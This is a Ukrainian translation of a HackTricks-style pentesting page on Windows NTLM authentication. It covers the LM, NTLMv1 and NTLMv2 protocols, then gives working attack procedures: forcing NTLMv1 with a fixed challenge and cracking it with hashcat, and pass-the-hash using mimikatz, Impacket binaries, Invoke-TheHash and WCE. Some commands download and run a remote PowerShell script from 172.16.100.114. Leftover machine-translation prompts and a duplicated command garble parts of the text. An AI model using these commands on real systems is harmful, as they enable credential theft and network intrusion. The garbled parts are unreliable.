# NTLM

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

У середовищах, де працюють **Windows XP та Server 2003**, використовуються LM (Lan Manager) хеші, хоча загальновідомо, що їх легко скомпрометувати. Конкретний LM хеш, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на ситуацію, коли LM не використовується, представляючи хеш для порожнього рядка.

За замовчуванням, **Kerberos** є основним методом аутентифікації. NTLM (NT LAN Manager) вступає в силу за певних обставин: відсутність Active Directory, неіснування домену, несправність Kerberos через неправильну конфігурацію або коли спроби підключення здійснюються за допомогою IP-адреси замість дійсного імені хоста.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах сигналізує про процес аутентифікації NTLM.

Підтримка протоколів аутентифікації - LM, NTLMv1 та NTLMv2 - забезпечується конкретним DLL, розташованим за адресою `%windir%\Windows\System32\msv1\_0.dll`.

**Ключові моменти**:

- LM хеші вразливі, а порожній LM хеш (`AAD3B435B51404EEAAD3B435B51404EE`) свідчить про його не використання.
- Kerberos є методом аутентифікації за замовчуванням, NTLM використовується лише за певних умов.
- Пакети аутентифікації NTLM можна ідентифікувати за заголовком "NTLMSSP".
- Протоколи LM, NTLMv1 та NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 та NTLMv2

Ви можете перевірити та налаштувати, який протокол буде використовуватися:

### GUI

Виконайте _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Мережевий захист: рівень аутентифікації LAN Manager. Є 6 рівнів (від 0 до 5).

![](<../../images/image (919).png>)

### Реєстр

Це встановить рівень 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Можливі значення:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Основна схема аутентифікації домену NTLM

1. **Користувач** вводить свої **облікові дані**
2. Клієнтська машина **надсилає запит на аутентифікацію**, відправляючи **ім'я домену** та **ім'я користувача**
3. **Сервер** надсилає **виклик**
4. **Клієнт шифрує** **виклик**, використовуючи хеш пароля як ключ, і надсилає його у відповідь
5. **Сервер надсилає** до **контролера домену** **ім'я домену, ім'я користувача, виклик та відповідь**. Якщо **немає** налаштованого Active Directory або ім'я домену є ім'ям сервера, облікові дані **перевіряються локально**.
6. **Контролер домену перевіряє, чи все вірно** і надсилає інформацію на сервер

**Сервер** та **Контролер домену** можуть створити **Безпечний канал** через **сервер Netlogon**, оскільки Контролер домену знає пароль сервера (він знаходиться в базі даних **NTDS.DIT**).

### Локальна схема аутентифікації NTLM

Аутентифікація така ж, як і згадувалася **раніше**, але **сервер** знає **хеш користувача**, який намагається аутентифікуватися в файлі **SAM**. Тому, замість того, щоб запитувати Контролер домену, **сервер перевірить самостійно**, чи може користувач аутентифікуватися.

### Виклик NTLMv1

**Довжина виклику становить 8 байт**, а **відповідь має довжину 24 байти**.

**Хеш NT (16 байт)** ділиться на **3 частини по 7 байт кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнена нулями**. Потім **виклик** **шифрується окремо** з кожною частиною, а **отримані** зашифровані байти **об'єднуються**. Всього: 8B + 8B + 8B = 24 байти.

**Проблеми**:

- Відсутність **випадковості**
- 3 частини можуть бути **атаковані окремо** для знаходження NT хешу
- **DES можна зламати**
- 3-й ключ завжди складається з **5 нулів**.
- За **однаковим викликом** **відповідь** буде **однаковою**. Тому ви можете дати жертві **виклик** у вигляді рядка "**1122334455667788**" і атакувати відповідь, використовуючи **попередньо обчислені райдужні таблиці**.

### Атака NTLMv1

В наш час стає все менш поширеним знаходити середовища з налаштованою неконтрольованою делегацією, але це не означає, що ви не можете **зловживати службою Print Spooler**, яка налаштована.

Ви могли б зловживати деякими обліковими даними/сесіями, які у вас вже є в AD, щоб **попросити принтер аутентифікуватися** проти деякого **хоста під вашим контролем**. Потім, використовуючи `metasploit auxiliary/server/capture/smb` або `responder`, ви можете **встановити виклик аутентифікації на 1122334455667788**, захопити спробу аутентифікації, і якщо вона була виконана за допомогою **NTLMv1**, ви зможете **зламати її**.\
Якщо ви використовуєте `responder`, ви можете спробувати \*\*використати прапор `--lm` \*\* для спроби **знизити** **аутентифікацію**.\
_Зверніть увагу, що для цієї техніки аутентифікація повинна виконуватися за допомогою NTLMv1 (NTLMv2 не є дійсним)._

Пам'ятайте, що принтер буде використовувати обліковий запис комп'ютера під час аутентифікації, а облікові записи комп'ютерів використовують **довгі та випадкові паролі**, які ви **ймовірно не зможете зламати**, використовуючи звичайні **словники**. Але **аутентифікація NTLMv1** **використовує DES** ([більше інформації тут](#ntlmv1-challenge)), тому, використовуючи деякі служби, спеціально призначені для зламу DES, ви зможете його зламати (ви можете використовувати [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com) наприклад).

### Атака NTLMv1 з hashcat

NTLMv1 також можна зламати за допомогою NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), який форматує повідомлення NTLMv1 у метод, який можна зламати за допомогою hashcat.

Команда
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the text you would like me to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content you would like to have translated.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Запустіть hashcat (найкраще в розподіленому режимі через інструмент, такий як hashtopolis), оскільки це займе кілька днів в іншому випадку.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
У цьому випадку ми знаємо, що пароль - це password, тому ми будемо обманювати для демонстраційних цілей:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Тепер нам потрібно використовувати hashcat-utilities, щоб перетворити зламані des ключі на частини NTLM хешу:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Please provide the text you would like translated.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text you would like me to translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Довжина виклику становить 8 байт** і **надсилаються 2 відповіді**: одна має **24 байти** в довжину, а довжина **іншої** є **змінною**.

**Перша відповідь** створюється шляхом шифрування за допомогою **HMAC_MD5** рядка, що складається з **клієнта та домену**, використовуючи в якості **ключа** хеш MD4 **NT hash**. Потім **результат** буде використаний як **ключ** для шифрування за допомогою **HMAC_MD5** виклику. До цього **додасться клієнтський виклик довжиною 8 байт**. Всього: 24 Б.

**Друга відповідь** створюється з використанням **кількох значень** (новий клієнтський виклик, **часова мітка** для запобігання **атакам повтору**...)

Якщо у вас є **pcap, який зафіксував успішний процес аутентифікації**, ви можете слідувати цьому посібнику, щоб отримати домен, ім'я користувача, виклик і відповідь та спробувати зламати пароль: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Якщо у вас є хеш жертви**, ви можете використовувати його для **імітування** її.\
Вам потрібно використовувати **інструмент**, який **виконає** **NTLM аутентифікацію, використовуючи** цей **хеш**, **або** ви можете створити новий **sessionlogon** і **впровадити** цей **хеш** в **LSASS**, так що коли будь-яка **NTLM аутентифікація буде виконана**, цей **хеш буде використаний.** Останній варіант - це те, що робить mimikatz.

**Будь ласка, пам'ятайте, що ви також можете виконувати атаки Pass-the-Hash, використовуючи облікові записи комп'ютерів.**

### **Mimikatz**

**Потрібно запускати від імені адміністратора**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Це запустить процес, який буде належати користувачам, які запустили mimikatz, але внутрішньо в LSASS збережені облікові дані - це ті, що всередині параметрів mimikatz. Тоді ви зможете отримати доступ до мережевих ресурсів так, ніби ви є тим користувачем (схоже на трюк `runas /netonly`, але вам не потрібно знати пароль у відкритому вигляді).

### Pass-the-Hash з linux

Ви можете отримати виконання коду на Windows машинах, використовуючи Pass-the-Hash з Linux.\
[**Доступ тут, щоб дізнатися, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows скомпільовані інструменти

Ви можете завантажити [impacket бінарники для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку вам потрібно вказати команду, cmd.exe та powershell.exe не є дійсними для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарників Impacket...

### Invoke-TheHash

Ви можете отримати скрипти powershell звідси: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ця функція є **поєднанням усіх інших**. Ви можете передати **кілька хостів**, **виключити** деяких і **вибрати** **опцію**, яку хочете використовувати (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви виберете **будь-який** з **SMBExec** і **WMIExec**, але не надасте жодного _**Command**_ параметра, вона просто **перевірить**, чи у вас є **достатні дозволи**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей інструмент виконає те ж саме, що і mimikatz (модифікує пам'ять LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ручне віддалене виконання Windows з ім'ям користувача та паролем

{{#ref}}
../lateral-movement/
{{#endref}}

## Витягування облікових даних з Windows Host

**Для отримання додаткової інформації про** [**те, як отримати облікові дані з Windows host, вам слід прочитати цю сторінку**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay та Responder

**Прочитайте більш детальний посібник про те, як виконати ці атаки тут:**

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Парсинг NTLM викликів з мережевого захоплення

**Ви можете використовувати** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

{{#include ../../banners/hacktricks-training.md}}
